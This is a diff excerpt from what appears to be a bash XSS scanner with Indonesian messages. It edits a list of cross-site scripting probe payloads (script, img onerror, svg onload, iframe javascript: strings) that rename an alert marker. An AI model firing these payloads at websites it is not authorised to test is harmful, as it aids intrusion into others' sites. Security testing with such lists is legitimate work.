@@ -12,11 +12,11 @@ url=$1
 
 # Payload list
 payloads=(
-    "'\"><script>alert(d4nu-ghost)</script>"
-    "\"><img src=x onerror=alert(d4nu-ghost)>"
-    "<svg onload=alert(d4nu-ghost)>"
-    "<iframe src=javascript:alert(d4nu-ghost)>"
-    "d4nu-ghost-xss"
+    "'\"><script>alert(d4nughost)</script>"
+    "\"><img src=x onerror=alert(d4nughost)>"
+    "<svg onload=alert(d4nughost)>"
+    "<iframe src=javascript:alert(d4nughost)>"
+    "d4nu ghost xss"
 )
 
 echo "🚀 Mulai scanning XSS di: $url"
